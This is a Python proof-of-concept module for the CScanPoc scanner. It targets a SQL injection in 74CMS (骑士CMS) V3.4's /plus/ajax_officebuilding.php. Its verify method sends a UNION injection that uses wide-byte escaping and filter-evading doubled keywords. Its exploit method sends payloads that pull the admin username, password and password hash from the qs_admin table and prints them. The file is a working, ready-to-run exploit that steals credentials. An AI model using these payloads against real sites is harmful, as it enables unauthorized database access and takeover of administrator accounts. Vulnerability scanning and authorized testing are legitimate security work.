# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = '74CMS_0000'  # 平台漏洞编号，留空
    name = '骑士CMS /plus/ajax_officebuilding.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-03'  # 漏洞公布时间
    desc = '''
        骑士CMS V3.4.20140530 /plus/ajax_officebuilding.php文件存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=063225'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '74CMS(骑士CMS)'  # 漏洞应用名称
    product_version = '3.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3fe66a1b-bdf4-4936-81b6-aef5d20a36c5'
    author = '国光'  # POC编写者
    create_date = '2018-05-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/plus/ajax_officebuilding.php?act=key&key=asd%錦%27%20uniounionn%20selselectect"
                       "%201,2,3,md5(7836457),5,6,7,8,9%23")
            verify_url = '{target}'.format(target=self.target)+payload
            request = urllib.request.Request(verify_url)
            response = urllib.request.urlopen(request)
            content = str(response.read())
            if '3438d5e3ead84b2effc5ec33ed1239f5' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\nSQL注入漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            vul_url = '{target}'.format(
                target=self.target)+"/plus/ajax_officebuilding.php"
            paload1 = (
                "?act=key&key=asd%錦%27%20uniounionn%20selselectect%201,2,3,admin_name,5,6,7,pwd,9%20from%20qs_admin%20LIMIT%201%23")
            paload2 = (
                "?act=key&key=asd%錦%27%20uniounionn%20selselectect%201,2,3,pwd_hash,5,6,7,8,9%20from%20qs_admin%20LIMIT%201%23")
            request = urllib.request.Request(vul_url + paload1)
            response = urllib.request.urlopen(request)
            content = str(response.read())
            pattern = re.compile(
                r'.*?<a[^>]*?>(?P<username>[^<>]*?)</a><span>(?P<password>[^<>]*?)</span>', re.I | re.S)
            match = pattern.match(content)
            if match != None:
                username = match.group('username').strip()
                password = match.group('password').strip()
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为:{username} 用户密码为:{password};\n具体请查看漏洞详情'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
